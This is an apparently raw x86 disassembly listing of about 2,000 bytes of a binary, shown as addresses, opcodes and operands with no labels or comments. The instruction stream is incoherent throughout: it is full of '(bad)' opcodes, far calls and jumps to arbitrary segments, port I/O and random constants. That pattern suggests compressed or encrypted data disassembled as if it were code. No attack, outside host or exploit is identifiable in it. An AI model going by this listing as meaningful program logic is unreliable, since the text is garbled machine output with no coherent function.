  41f170:	mov    ch,0xc7
  41f172:	ss (bad) 
  41f174:	mov    bl,0xd5
  41f176:	mov    al,0xd
  41f178:	xlat   BYTE PTR ds:[ebx]
  41f179:	push   ss
  41f17a:	xchg   dl,ch
  41f17c:	and    esi,edx
  41f17e:	mov    ds:0x30855d6a,eax
  41f183:	sbb    esi,ebx
  41f185:	push   ecx
  41f186:	push   ebx
  41f187:	jge    0x41f16d
  41f189:	sahf   
  41f18a:	mov    edi,0x1399460e
  41f18f:	and    al,0x94
  41f191:	push   ebx
  41f192:	test   DWORD PTR [edx-0xacd4961],esp
  41f198:	retf   
  41f199:	cld    
  41f19a:	sub    DWORD PTR [edi-0x72],edi
  41f19d:	out    0x9a,eax
  41f19f:	lock mov es,WORD PTR [edi]
  41f1a2:	add    ch,BYTE PTR [ebx-0x77aa9a8b]
  41f1a8:	daa    
  41f1a9:	shl    BYTE PTR [ebx-0x48],1
  41f1ac:	test   DWORD PTR [edi-0x34],edx
  41f1af:	mov    ebp,0x8f7af060
  41f1b4:	inc    ebx
  41f1b5:	stos   BYTE PTR es:[edi],al
  41f1b6:	push   edi
  41f1b7:	data16 fwait
  41f1b9:	jg     0x41f1e3
  41f1bb:	xor    DWORD PTR [ebp-0x53],ebp
  41f1be:	retf   
  41f1bf:	jecxz  0x41f1f8
  41f1c1:	stos   DWORD PTR es:[edi],eax
  41f1c2:	pop    es
  41f1c3:	add    eax,0x85131f39
  41f1c8:	in     eax,dx
  41f1c9:	mov    al,0x7d
  41f1cb:	sbb    eax,0x85881674
  41f1d0:	or     bl,bl
  41f1d2:	adc    bl,al
  41f1d4:	mov    ebp,0x75d2ed90
  41f1d9:	(bad)  
  41f1da:	mov    ebx,0x20e3483a
  41f1df:	dec    esp
  41f1e0:	xor    cl,ch
  41f1e2:	pop    eax
  41f1e3:	ss push cs
  41f1e5:	dec    eax
  41f1e6:	cpuid  
  41f1e8:	mov    cl,0xde
  41f1ea:	sti    
  41f1eb:	and    eax,DWORD PTR [eax+ecx*1+0x17a3d1ce]
  41f1f2:	jecxz  0x41f238
  41f1f4:	test   eax,0x3db0ced4
  41f1f9:	je     0x41f1cc
  41f1fb:	add    dl,dl
  41f1fd:	dec    esp
  41f1fe:	fdiv   QWORD PTR gs:[eax-0x3bcd01f1]
  41f205:	jmp    0x81b5e820
  41f20a:	stc    
  41f20b:	xor    ecx,DWORD PTR [ecx-0x86da8c8]
  41f211:	jp     0x41f1ed
  41f213:	adc    al,0x17
  41f215:	sub    al,0xef
  41f217:	adc    DWORD PTR [ebx-0x5b],esi
  41f21a:	cmp    BYTE PTR [edi+0x5b],0x30
  41f21e:	lods   eax,DWORD PTR ds:[esi]
  41f21f:	ret    0xd9d1
  41f222:	lea    esi,[ebx]
  41f224:	mov    cs,WORD PTR [ebx-0x4ca5c00c]
  41f22a:	sbb    DWORD PTR [edi-0x48a99aa7],edx
  41f230:	in     eax,dx
  41f231:	dec    ebp
  41f232:	mov    BYTE PTR [ecx+0x1a],dh
  41f235:	(bad)  
  41f236:	or     al,0x4f
  41f238:	sbb    eax,0x9ee20225
  41f23d:	pop    es
  41f23e:	cmp    al,0x33
  41f240:	pop    ss
  41f241:	sub    eax,0xf62a6fb0
  41f246:	push   ebp
  41f247:	push   cs
  41f248:	or     DWORD PTR [esi-0x2e],ecx
  41f24b:	mov    ch,0x19
  41f24d:	add    DWORD PTR [ebx+0x5986608b],eax
  41f253:	push   ss
  41f254:	mul    cl
  41f256:	sbb    al,0x6a
  41f258:	rcr    DWORD PTR [edx+0x1b],0xae
  41f25c:	call   0x2e47:0xa778943b
  41f263:	push   ds
  41f264:	ret    0x228a
  41f267:	les    edi,FWORD PTR [ebp+0x36]
  41f26a:	stos   DWORD PTR es:[edi],eax
  41f26b:	aaa    
  41f26c:	mov    ds:0x18e83b0b,al
  41f271:	call   0xf6f19e58
  41f276:	dec    ebx
  41f277:	jb     0x41f265
  41f279:	xchg   ebp,eax
  41f27a:	sbb    eax,0x70d572f
  41f27f:	jp     0x41f222
  41f281:	cmp    edx,DWORD PTR ds:0xe300fcd8
  41f287:	cmp    dh,BYTE PTR [edi+0x329e6989]
  41f28d:	push   0x24229d67
  41f292:	ins    BYTE PTR es:[edi],dx
  41f293:	xor    edi,DWORD PTR ss:[edx+0x68]
  41f297:	xor    dh,al
  41f299:	icebp  
  41f29a:	dec    eax
  41f29b:	push   ebp
  41f29c:	or     esi,esi
  41f29e:	jae    0x41f227
  41f2a0:	aas    
  41f2a1:	popf   
  41f2a2:	xor    BYTE PTR [esi-0x70],ch
  41f2a5:	add    al,0x1
  41f2a7:	or     ebp,DWORD PTR [edx-0x5c8fa299]
  41f2ad:	in     al,dx
  41f2ae:	retf   
  41f2af:	fs test eax,0x8f7dc5db
  41f2b5:	out    0x7,eax
  41f2b7:	repnz mov edx,0x2f1f448e
  41f2bd:	push   ss
  41f2be:	xor    bl,0x63
  41f2c1:	lock int 0xc5
  41f2c4:	int3   
  41f2c5:	or     al,0xf3
  41f2c7:	je     0x41f2ca
  41f2c9:	jnp    0x41f2dc
  41f2cb:	jb     0x41f2bc
  41f2cd:	inc    ebx
  41f2ce:	loopne 0x41f2b9
  41f2d0:	pop    ds
  41f2d1:	fsubp  st(4),st
  41f2d3:	cmovl  esp,DWORD PTR [esi]
  41f2d6:	mov    cs,WORD PTR [ebx-0x488b7d37]
  41f2dc:	leave  
  41f2dd:	js     0x41f2cb
  41f2df:	push   esp
  41f2e0:	xor    BYTE PTR [eax],dh
  41f2e2:	dec    esp
  41f2e3:	mov    ch,BYTE PTR [ecx]
  41f2e5:	push   edi
  41f2e6:	call   0x8f6366d7
  41f2eb:	pop    gs
  41f2ed:	sti    
  41f2ee:	adc    edi,edi
  41f2f0:	push   ss
  41f2f1:	leave  
  41f2f2:	inc    edx
  41f2f3:	jb     0x41f30a
  41f2f5:	jae    0x41f31c
  41f2f7:	mov    dh,0x6f
  41f2f9:	mov    ebx,0x2ac23be1
  41f2fe:	call   0x76c5:0xc282f413
  41f305:	cmp    al,0xbf
  41f307:	mov    ebp,0x1660c14a
  41f30c:	dec    esp
  41f30d:	sbb    eax,0x72fe2900
  41f312:	call   0x46c48178
  41f317:	clc    
  41f318:	xchg   ebp,eax
  41f319:	ins    DWORD PTR es:[edi],dx
  41f31a:	in     al,dx
  41f31b:	push   ecx
  41f31c:	sbb    eax,0xb4a16741
  41f321:	dec    edx
  41f322:	mov    ebx,0x73c2690e
  41f327:	xor    eax,0x4f9f4c20
  41f32c:	xor    eax,0x5b82e04f
  41f331:	mov    ah,BYTE PTR [edi+0x24]
  41f334:	xor    DWORD PTR [edi+0x4958e8f2],esp
  41f33a:	fs ret 0x122f
  41f33e:	lock mov esp,0x4d6cb527
  41f344:	jo     0x41f307
  41f346:	(bad)  
  41f347:	xchg   esp,eax
  41f348:	test   esp,edi
  41f34a:	xchg   ah,cl
  41f34c:	mov    ebx,0xb31d95ef
  41f351:	es dec eax
  41f353:	xchg   edi,eax
  41f354:	leave  
  41f355:	xchg   BYTE PTR [eax+0x4e],dh
  41f358:	outs   dx,BYTE PTR ds:[esi]
  41f359:	int    0xc4
  41f35b:	stc    
  41f35c:	push   0xffffffd7
  41f35e:	sbb    DWORD PTR [edi+0x45],ebx
  41f361:	adc    al,0xc5
  41f363:	imul   ebp,ebp,0x87fe8973
  41f369:	jmp    FWORD PTR [ebp+edx*4-0xa]
  41f36d:	sub    DWORD PTR [edi],0x6630c1bd
  41f373:	sub    al,0x95
  41f375:	sbb    ebp,DWORD PTR [esi]
  41f377:	or     BYTE PTR [edi-0x3dd41893],0x64
  41f37e:	and    ebx,DWORD PTR [ecx+0x36]
  41f381:	pop    esi
  41f382:	or     dl,ch
  41f384:	test   al,0x81
  41f386:	push   ebp
  41f387:	addr16 push 0x391c491
  41f38d:	not    BYTE PTR [esi+0x697b675a]
  41f393:	dec    ebx
  41f394:	add    al,0x21
  41f396:	cli    
  41f397:	enter  0xb59,0xda
  41f39b:	jo     0x41f385
  41f39d:	stc    
  41f39e:	pushf  
  41f39f:	fisub  WORD PTR [ecx]
  41f3a1:	pop    ecx
  41f3a2:	bound  edi,QWORD PTR [ecx+0x4f599474]
  41f3a8:	repnz pop edx
  41f3aa:	popa   
  41f3ab:	pop    edi
  41f3ac:	push   edx
  41f3ad:	jo     0x41f345
  41f3af:	bound  edx,QWORD PTR [esi+0x77]
  41f3b2:	data16 lahf 
  41f3b4:	mov    ah,0x33
  41f3b6:	xor    bl,BYTE PTR [ebp-0x1a]
  41f3b9:	fld    DWORD PTR [ecx-0x13]
  41f3bc:	push   ecx
  41f3bd:	call   0x9aa8:0x4156dbd3
  41f3c4:	sub    al,bh
  41f3c6:	addr16 jp 0x41f374
  41f3c9:	pop    ss
  41f3ca:	out    dx,al
  41f3cb:	sbb    edi,DWORD PTR [esi-0x2cbc8525]
  41f3d1:	popa   
  41f3d2:	inc    esp
  41f3d3:	inc    edx
  41f3d4:	and    eax,0x9a417132
  41f3d9:	xchg   esi,eax
  41f3da:	mov    dh,0x53
  41f3dc:	push   edx
  41f3dd:	fimul  WORD PTR [esi-0x7dccc1f2]
  41f3e3:	mov    BYTE PTR [eax],0xd2
  41f3e6:	sub    DWORD PTR [edi-0x5f],0xe5f03465
  41f3ed:	and    al,0xfc
  41f3ef:	pop    esp
  41f3f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3f1:	fucomp st(2)
  41f3f3:	dec    ecx
  41f3f4:	in     al,0xf3
  41f3f6:	xor    BYTE PTR [edx+0x13],dl
	...
  41f5cc:	add    BYTE PTR [esp+ebp*2],bl
  41f5cf:	ins    DWORD PTR es:[edi],dx
  41f5d0:	les    edi,FWORD PTR [ebp-0x3b]
  41f5d3:	mov    ebp,0x7e8bcdfc
  41f5d8:	jae    0x41f61f
  41f5da:	hlt    
  41f5db:	lea    esp,[ebx+ebx*4+0x2500013e]
  41f5e2:	pop    es
  41f5e3:	add    BYTE PTR [eax],al
  41f5e5:	mov    esp,0x2b0c54c7
  41f5ea:	(bad)  
  41f5eb:	sub    WORD PTR [esi+0x4763b606],0xffb3
  41f5f3:	push   eax
  41f5f4:	xchg   esp,eax
  41f5f5:	cld    
  41f5f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5f7:	push   ebx
  41f5f8:	test   cl,bh
  41f5fa:	xchg   DWORD PTR [edi],esp
  41f5fc:	and    ebp,ebx
  41f5fe:	idiv   eax
  41f600:	cld    
  41f601:	adc    al,0xa5
  41f603:	mov    al,ds:0x8a0d39d3
  41f608:	xlat   BYTE PTR ds:[ebx]
  41f609:	jecxz  0x41f5dc
  41f60b:	inc    edx
  41f60c:	js     0x41f5a3
  41f60e:	fist   DWORD PTR [ebx-0x52b129a0]
  41f614:	fcmove st,st(1)
  41f616:	jo     0x41f5d4
  41f618:	push   ebp
  41f619:	js     0x41f693
  41f61b:	outs   dx,BYTE PTR ds:[esi]
  41f61c:	pusha  
  41f61d:	cli    
  41f61e:	push   eax
  41f61f:	nop
  41f620:	inc    esp
  41f621:	addr16 dec ebx
  41f623:	adc    esi,DWORD PTR [eax+0x1b]
  41f626:	iret   
  41f627:	in     eax,dx
  41f628:	add    BYTE PTR [edi+ecx*1-0x176f5227],0xc7
  41f630:	jle    0x41f5df
  41f632:	rcr    ebx,0x11
  41f635:	xor    ebp,edi
  41f637:	fstp   QWORD PTR [ebp-0x635740e3]
  41f63d:	xchg   DWORD PTR [ebp-0x54],eax
  41f640:	sub    eax,0xa641dcc3
  41f645:	adc    edi,DWORD PTR [ebx+0x12e4739b]
  41f64b:	inc    edx
  41f64c:	jl     0x41f64b
  41f64e:	xchg   ecx,eax
  41f64f:	inc    ecx
  41f650:	fwait
  41f651:	outs   dx,BYTE PTR ds:[esi]
  41f652:	cmp    al,0xef
  41f654:	fadd   DWORD PTR [ecx-0x19c130ba]
  41f65a:	xor    esp,DWORD PTR [ebp+0x1a3a528a]
  41f660:	dec    eax
  41f661:	fsubr  st,st(5)
  41f663:	fistp  QWORD PTR [ebx+0x58]
  41f666:	loope  0x41f674
  41f668:	dec    esi
  41f669:	push   ebp
  41f66a:	(bad)  [esi+0x65e1c94]
  41f670:	mov    dl,0x31
  41f672:	ret    0x70a8
  41f675:	jge    0x41f635
  41f677:	push   edi
  41f678:	test   esi,eax
  41f67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f67b:	shl    BYTE PTR [ecx+0x41d2929],0xe9
  41f682:	dec    edx
  41f683:	out    0xed,eax
  41f685:	cmc    
  41f686:	push   0x808cfca3
  41f68b:	jmp    0x720b481e
  41f690:	cmp    DWORD PTR [ecx-0x78],esi
  41f693:	popf   
  41f694:	mov    DWORD PTR [edi-0x77f44e67],edx
  41f69a:	or     BYTE PTR [ecx+edx*2+0x509c50a0],bl
  41f6a1:	daa    
  41f6a2:	push   esp
  41f6a3:	pop    es
  41f6a4:	call   DWORD PTR [edx+0x7d]
  41f6a7:	outs   dx,BYTE PTR ds:[esi]
  41f6a8:	stc    
  41f6a9:	cmp    bh,BYTE PTR [edx+edx*4]
  41f6ac:	push   0x2b
  41f6ae:	sbb    eax,0x6faca858
  41f6b3:	inc    ebp
  41f6b4:	pop    ebp
  41f6b5:	mov    al,0xfb
  41f6b7:	rcl    DWORD PTR [ecx+0x3f],0xc0
  41f6bb:	xchg   esp,ecx
  41f6bd:	bound  ecx,QWORD PTR [ecx+0x18]
  41f6c0:	rcr    DWORD PTR [edi-0x60cabaf6],0x96
  41f6c7:	mov    esp,0xdf74e977
  41f6cc:	lods   eax,DWORD PTR ds:[esi]
  41f6cd:	pop    eax
  41f6ce:	pop    edi
  41f6cf:	push   es
  41f6d0:	loope  0x41f661
  41f6d2:	pop    eax
  41f6d3:	xchg   edi,eax
  41f6d4:	call   0x83e6:0x2f4138a
  41f6db:	dec    esp
  41f6dc:	fdivr  DWORD PTR [edx]
  41f6de:	les    esp,FWORD PTR [edx-0x60]
  41f6e1:	add    al,BYTE PTR ds:0xdd24ec1d
  41f6e7:	in     al,0x89
  41f6e9:	dec    ecx
  41f6ea:	dec    esp
  41f6eb:	jp     0x41f707
  41f6ed:	dec    ecx
  41f6ee:	lfs    eax,FWORD PTR [edx-0x186a0e16]
  41f6f5:	int3   
  41f6f6:	cmp    BYTE PTR [edx+0xa060bac],al
  41f6fc:	xchg   ecx,eax
  41f6fd:	ja     0x41f6f5
  41f6ff:	cs jl  0x41f6a8
  41f702:	mov    esi,0xc622aec6
  41f707:	pusha  
  41f708:	push   edi
  41f709:	sub    edi,DWORD PTR [esi-0x6d469a24]
  41f70f:	jl     0x41f6b3
  41f711:	sar    DWORD PTR [edi+0x2a868174],cl
  41f717:	lock inc ecx
  41f719:	into   
  41f71a:	loope  0x41f762
  41f71c:	mov    ah,0x8d
  41f71e:	xchg   ebx,eax
  41f71f:	add    bh,BYTE PTR [ebx]
  41f721:	outs   dx,DWORD PTR ds:[esi]
  41f722:	sar    BYTE PTR [edx-0x3d],0xf4
  41f726:	dec    ebp
  41f727:	(bad)  
  41f728:	jmp    0x41f75f
  41f72a:	sbb    BYTE PTR [ecx+0x30d897ef],al
  41f730:	setne  BYTE PTR [ecx-0x4ac9a739]
  41f737:	dec    edi
  41f738:	ins    BYTE PTR es:[edi],dx
  41f739:	mov    ds:0x7c09ea4b,eax
  41f73e:	mov    al,ds:0x70a4dc70
  41f743:	pushf  
  41f744:	iret   
  41f745:	mov    ebx,0x10bc10e7
  41f74a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f74b:	add    DWORD PTR [ebx+0x73],0x4481bfad
  41f752:	mov    al,ds:0xb3ff0730
  41f757:	push   eax
  41f758:	pop    es
  41f759:	imul   edi,DWORD PTR [esi-0x73],0xffffffb9
  41f75d:	mov    ah,0x11
  41f75f:	and    bl,BYTE PTR [ecx-0xeed8c47]
  41f765:	retf   0x9d20
  41f768:	sub    esi,ecx
  41f76a:	sub    DWORD PTR [ebx],ebp
  41f76c:	stos   BYTE PTR es:[edi],al
  41f76d:	shr    cl,cl
  41f76f:	repnz pop ebp
  41f771:	mov    eax,ds:0xbcc40bf1
  41f776:	bound  esi,QWORD PTR [esi+0x4ce9d847]
  41f77c:	dec    ecx
  41f77d:	push   edi
  41f77e:	lahf   
  41f77f:	fwait
  41f780:	retf   
  41f781:	adc    ebp,DWORD PTR [ebp-0x7f14591f]
  41f787:	cld    
  41f788:	enter  0x1d6f,0x55
  41f78c:	test   BYTE PTR [esi+0x596dc2d1],al
  41f792:	mov    ds:0x42b610a2,al
  41f797:	rcr    BYTE PTR [ebx+0x68d13965],1
  41f79d:	sbb    esp,edx
  41f79f:	sahf   
  41f7a0:	or     BYTE PTR [ebp-0x39],ah
  41f7a3:	call   0x66444423
  41f7a8:	pop    ecx
  41f7a9:	inc    esi
  41f7aa:	push   esp
  41f7ab:	les    ecx,FWORD PTR [edi+0x5]
  41f7ae:	sbb    al,0xbd
  41f7b0:	cld    
  41f7b1:	sar    eax,cl
  41f7b3:	jno    0x41f81e
  41f7b5:	xchg   ebp,eax
  41f7b6:	fldenv [ebp-0x4cce97aa]
  41f7bc:	and    BYTE PTR [edx+0x62c21256],al
  41f7c2:	pop    edi
  41f7c3:	gs mov bx,0x988c
  41f7c8:	or     ebx,ecx
  41f7ca:	sub    ebp,edx
  41f7cc:	dec    edx
  41f7cd:	push   ebx
  41f7ce:	jbe    0x41f840
  41f7d0:	cmp    BYTE PTR [edx],dl
  41f7d2:	lea    edx,[ecx+0x76]
  41f7d5:	jp     0x41f772
  41f7d7:	mov    ds:0xdfe06234,al
  41f7dc:	mov    esp,0x3a54f20a
  41f7e1:	jmp    0x17ff:0xfdee61a1
  41f7e8:	arpl   WORD PTR [ebx+0x492c6e4f],sp
  41f7ee:	(bad)  
  41f7ef:	fistp  QWORD PTR [esi-0x33]
  41f7f2:	outs   dx,DWORD PTR ds:[esi]
  41f7f3:	ud1    esp,ebp
  41f7f6:	stc    
  41f7f7:	jecxz  0x41f857
  41f7f9:	push   0xffffff80
  41f7fb:	(bad)  
  41f7fd:	gs jns 0x41f806
  41f800:	mov    bl,0x1
  41f802:	popf   
  41f803:	sub    edi,ecx
  41f805:	es scas al,BYTE PTR es:[edi]
  41f807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f808:	and    al,0xe2
  41f80b:	xchg   ebp,eax
  41f80c:	cli    
  41f80d:	cmp    edx,DWORD PTR [edi+0x7c]
  41f810:	and    cl,BYTE PTR [esp+eiz*2+0x668c16]
  41f817:	iret   
  41f818:	jo     0x41f814
  41f81a:	das    
  41f81b:	dec    edx
  41f81c:	lds    ecx,FWORD PTR ds:0xd4d0ca62
  41f822:	mov    eax,ds:0xc6ea4837
  41f827:	jbe    0x41f88a
  41f829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f82a:	dec    edi
  41f82b:	rol    DWORD PTR [edx+0x16e24edb],0xd5
  41f832:	push   edx
  41f833:	loopne 0x41f872
  41f835:	pop    edx
  41f836:	mov    al,ds:0x21f95290
  41f83b:	(bad)  
  41f83c:	jmp    0x41f7fd
  41f83e:	sbb    eax,0x394e82b0
  41f843:	xor    BYTE PTR [ecx+0x56e5ec5f],0x9c
  41f84a:	inc    ecx
  41f84b:	pop    ebp
  41f84c:	fwait
  41f84d:	sbb    BYTE PTR [eax+0x31],dl
  41f850:	dec    esi
  41f851:	cdq    
  41f852:	ja     0x41f88e
  41f854:	jmp    0xa99:0xc0e7ee61
  41f85b:	clc    
  41f85c:	add    eax,0xaa83c3f2
  41f861:	adc    esi,DWORD PTR [ecx+ebp*2]
  41f864:	fistp  QWORD PTR [edi-0x5c]
  41f867:	pop    ecx
  41f868:	fdivr  QWORD PTR [ecx]
  41f86a:	xchg   ecx,eax
  41f86b:	out    dx,al
  41f86c:	mov    ah,0x39
  41f86e:	mov    eax,ds:0x7ea70b6d
  41f873:	leave  
  41f874:	mov    al,ds:0xcbaf70e4
  41f879:	popf   
  41f87a:	pop    es
  41f87b:	lock sbb BYTE PTR [ecx+0xbb99bda],0x1b
  41f883:	mov    esp,0xdab79f46
  41f888:	fnstenv [ebx]
  41f88a:	pusha  
  41f88b:	pusha  
  41f88c:	out    dx,al
  41f88d:	jb     0x41f8e3
  41f88f:	(bad)  
  41f890:	fdivr  QWORD PTR [ebx-0xc180a23]
  41f896:	(bad)  
  41f897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f899:	pop    edx
  41f89a:	dec    eax
  41f89b:	retf   
  41f89c:	js     0x41f904
  41f89e:	not    DWORD PTR [ebx-0x15]
  41f8a1:	or     cl,BYTE PTR [esi]
  41f8a3:	push   eax
  41f8a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8a5:	xchg   ecx,eax
  41f8a6:	pop    edi
  41f8a7:	popf   
  41f8a8:	jne    0x41f923
  41f8aa:	jge    0x41f8b3
  41f8ac:	aam    0x55
  41f8ae:	rcl    BYTE PTR [ebp-0x28],cl
  41f8b1:	fwait
  41f8b2:	jg     0x41f90f
  41f8b4:	sub    ah,cl
  41f8b6:	push   0xffffff9d
  41f8b8:	stc    
  41f8b9:	adc    esp,ecx
  41f8bb:	sbb    ah,BYTE PTR [esi-0x75a0cf3d]
  41f8c1:	add    al,0x79
  41f8c3:	dec    ecx
  41f8c4:	or     BYTE PTR [ecx+eiz*4],ah
  41f8c7:	or     esi,DWORD PTR ds:0x1dc6e63e
  41f8cd:	out    0xfa,al
  41f8cf:	stos   DWORD PTR es:[edi],eax
  41f8d0:	hlt    
  41f8d1:	loop   0x41f8e4
  41f8d3:	sub    BYTE PTR [ecx-0xb],ch
  41f8d6:	adc    ebp,DWORD PTR [ebx+0x59cacc11]
  41f8dc:	imul   ecx,esp,0xfffffffe
  41f8df:	neg    esp
  41f8e1:	add    cl,ah
  41f8e3:	mov    cl,0x91
  41f8e5:	dec    ebx
  41f8e6:	xor    esp,eax
  41f8e8:	pushf  
  41f8e9:	lock neg BYTE PTR [ebp+0x60]
  41f8ed:	arpl   WORD PTR [esi+ebx*1],cx
  41f8f0:	and    cl,BYTE PTR [esi+0x6e]
  41f8f3:	rcl    BYTE PTR [edx+0x21a629df],0x4b
  41f8fa:	clc    
  41f8fb:	add    BYTE PTR [edi],bl
  41f8fd:	dec    ebx
  41f8fe:	lds    edx,FWORD PTR [ebx-0x6e]
  41f901:	pop    edx
  41f902:	cs pusha 
  41f904:	mov    ebx,esp
  41f906:	sub    cl,BYTE PTR [edi+0x7e]
  41f909:	xchg   edi,eax
  41f90a:	fs cmc 
  41f90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f90d:	sub    eax,0x5ecb02bb
  41f912:	sbb    DWORD PTR [edx],edx
  41f914:	test   BYTE PTR [ebp-0x31],bl
  41f917:	jg     0x41f98c
  41f919:	pushf  
  41f91a:	pop    ds
  41f91b:	jnp    0x41f8d2
  41f91d:	xchg   ebx,eax
  41f91e:	mov    al,bl
  41f920:	(bad)  
  41f921:	js     0x41f94b
  41f923:	and    bh,ah
  41f925:	aas    
  41f926:	ins    DWORD PTR es:[edi],dx
  41f927:	fld    TBYTE PTR [eax+0x4a]
  41f92a:	sub    eax,0xc7163416
  41f92f:	fidivr WORD PTR [edi+0x24]
  41f932:	inc    ebp
  41f933:	adc    DWORD PTR [ecx+edi*1],eax
  41f936:	ss (bad) 
  41f938:	(bad)  
  41f939:	jne    0x41f8fd
  41f93b:	xchg   edx,eax
  41f93c:	xor    al,0x83
  41f93e:	xchg   ebp,eax
  41f93f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f940:	imul   BYTE PTR [esi+ebx*8+0x69]
  41f944:	nop
  41f945:	ja     0x41f8fe
  41f947:	push   ebx
  41f948:	xchg   edx,eax
  41f949:	loop   0x41f9c8
  41f94b:	dec    esi
  41f94c:	enter  0x17d0,0xaa
  41f950:	push   0xffffffbb
  41f952:	sub    ebp,DWORD PTR [edi-0x4542c6fa]
  41f958:	clc    
  41f959:	or     eax,0x5120b3eb
  41f95e:	jp     0x41f9a5
  41f960:	dec    eax
  41f961:	sub    eax,0x9c9b8e96
  41f966:	test   eax,0x615ec25d
  41f96b:	cmp    bl,ch
  41f96d:	addr16 in eax,dx
  41f96f:	jnp    0x41f9c6
  41f971:	inc    ebp
  41f972:	repnz bswap edi
  41f975:	and    ebp,DWORD PTR [esi]
  41f977:	loopne 0x41f93c
  41f979:	ds push ds
  41f97b:	push   ds
  41f97c:	sub    BYTE PTR [ebx],dl
  41f97e:	inc    esi
  41f97f:	mov    esp,0xfaeca243
  41f984:	std    
  41f985:	out    0x5e,al
  41f987:	aam    0x5d
  41f989:	xor    ch,ah
  41f98b:	push   eax
  41f98c:	clc    
  41f98d:	mov    al,ds:0x1fd7d841
  41f992:	pop    ebx
  41f993:	xchg   ecx,eax
  41f994:	pop    ecx
  41f995:	xchg   ah,dl
  41f997:	and    ah,dh
  41f999:	dec    esi
  41f99a:	or     cl,BYTE PTR [ebp+0x3a]
  41f99d:	bound  esp,QWORD PTR [edi+0x408f0c9b]
  41f9a3:	mov    esi,0x61bc3e6c
  41f9a8:	sbb    ebp,DWORD PTR [edx]
  41f9aa:	in     eax,dx
  41f9ab:	leave  
  41f9ac:	int3   
  41f9ad:	xor    al,0xb1
  41f9af:	fcmovu st,st(2)
  41f9b1:	add    BYTE PTR [eax],dl
  41f9b3:	mov    dh,0xb6
  41f9b5:	fdiv   QWORD PTR [esi-0x65]
  41f9b8:	inc    esp
  41f9b9:	add    bh,bl
  41f9bb:	lea    esp,[ebp-0x4]
  41f9be:	test   BYTE PTR [ebx-0x5d],0xd3
  41f9c2:	or     ah,BYTE PTR [ebp+0x7d]
  41f9c5:	pop    ebp
  41f9c6:	pop    es
  41f9c7:	adc    ch,BYTE PTR [ebp-0x35]
  41f9ca:	lea    ebp,[eax-0x62]
  41f9cd:	sahf   
  41f9ce:	adc    al,0x9e
  41f9d0:	jae    0x41f9a4
  41f9d2:	sbb    edi,DWORD PTR [ebx+0x12f35e29]
  41f9d8:	es in  eax,0xe0
  41f9db:	fwait
  41f9dc:	repnz (bad) 
  41f9de:	out    dx,eax
  41f9df:	ds push ebx
  41f9e1:	xchg   edx,eax
  41f9e2:	call   0xfa21:0x1ba8ec9c
  41f9e9:	add    BYTE PTR [edx+0x34],0x1f
  41f9ed:	clc    
  41f9ee:	jmp    0x41f9d6
  41f9f0:	stos   DWORD PTR es:[edi],eax
  41f9f1:	sub    BYTE PTR [esp+edi*2+0x51],dh
  41f9f5:	and    dl,BYTE PTR [esi+esi*2-0x51f880fc]
  41f9fc:	jo     0x41f990
  41f9fe:	dec    ebp
  41f9ff:	lds    esp,FWORD PTR [ecx+0x33df5664]
  41fa05:	mov    BYTE PTR [edx+0x6f],dl
  41fa08:	add    eax,0x621e59ab
  41fa0d:	stos   BYTE PTR es:[edi],al
  41fa0e:	xlat   BYTE PTR ds:[ebx]
  41fa0f:	pop    eax
  41fa10:	mov    ds:0xff2220d,eax
  41fa15:	xchg   edx,eax
  41fa16:	ss loop 0x41fa02
  41fa19:	push   eax
  41fa1a:	out    0xe7,al
  41fa1c:	je     0x41fa11
  41fa1e:	cmp    eax,0x509a72d9
  41fa23:	pop    eax
  41fa24:	xor    ebx,DWORD PTR ss:0xcf245d3f
  41fa2b:	in     eax,0x7
  41fa2d:	inc    ecx
  41fa2e:	repnz mov ch,0x97
  41fa31:	shr    BYTE PTR [edx],1
  41fa33:	mov    ebx,0x1c98249e
  41fa38:	adc    DWORD PTR [esi],eax
  41fa3a:	push   edx
  41fa3b:	mov    WORD PTR [edx],es
  41fa3d:	ror    BYTE PTR [ecx+ebp*4],0xa4
  41fa41:	add    eax,0x3c00a6c7
  41fa46:	sbb    al,BYTE PTR [edi]
  41fa48:	push   eax
  41fa49:	cmc    
  41fa4a:	fwait
  41fa4b:	cmp    BYTE PTR [eax+eiz*8-0x1dca3783],cl
  41fa52:	fwait
  41fa53:	test   bl,al
  41fa55:	adc    esi,DWORD PTR [eax-0xeaa246b]
  41fa5b:	push   esi
  41fa5c:	push   edx
  41fa5d:	lods   eax,DWORD PTR ds:[esi]
  41fa5e:	xor    eax,0x6aa62e2f
  41fa63:	inc    ecx
  41fa64:	shl    DWORD PTR [edx],1
  41fa66:	jnp    0x41fa36
  41fa68:	xchg   ebp,eax
  41fa69:	cmp    BYTE PTR [ecx+edi*8-0x3a],dh
  41fa6d:	mov    ah,0x8d
  41fa6f:	int3   
  41fa70:	xor    eax,0xeab76f9e
  41fa75:	ins    DWORD PTR es:[edi],dx
  41fa76:	jns    0x41fa4b
  41fa78:	cwde   
  41fa79:	xor    ebp,DWORD PTR [esi]
  41fa7b:	jmp    0xd724:0xf0781d6
  41fa82:	test   cl,bh
  41fa84:	outs   dx,DWORD PTR ds:[esi]
  41fa85:	rcr    DWORD PTR [eax],0x81
  41fa88:	(bad)  
  41fa89:	add    dh,BYTE PTR [ecx-0x73]
  41fa8c:	cmp    eax,0x3b808ca3
  41fa91:	shr    DWORD PTR [esi],cl
  41fa93:	inc    esp
  41fa94:	sbb    eax,0x5e7b4498
  41fa99:	pop    edx
  41fa9a:	aam    0xff
  41fa9c:	mov    bl,0x80
  41fa9e:	hlt    
  41fa9f:	in     eax,dx
  41faa0:	xor    eax,0x776ede8b
  41faa5:	popa   
  41faa6:	lods   al,BYTE PTR ds:[esi]
  41faa7:	xchg   edi,eax
  41faa8:	adc    ebx,DWORD PTR [eax-0x839f8a5]
  41faae:	out    dx,al
  41faaf:	call   0x943f:0xf83cc5ed
  41fab6:	popf   
  41fab7:	push   eax
  41fab8:	mov    cl,0xab
  41faba:	aad    0xb6
